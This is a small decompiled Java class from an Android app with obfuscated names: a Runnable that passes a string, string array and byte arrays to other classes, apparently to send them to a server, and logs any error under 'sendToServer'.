package com.network.android;

import android.content.Context;
import com.network.android.c.a.a;

/* access modifiers changed from: package-private */
public final class k implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ String f82a;
    final /* synthetic */ String[] b;
    final /* synthetic */ byte[][] c;
    final /* synthetic */ Context d;

    k(String str, String[] strArr, byte[][] bArr, Context context) {
        this.f82a = str;
        this.b = strArr;
        this.c = bArr;
        this.d = context;
    }

    public final void run() {
        try {
            j.a(new i(this.f82a, this.b, this.c), this.d);
            j.a(this.d);
        } catch (Throwable th) {
            a.a("sendToServer: " + th.getMessage(), th);
        }
    }
}
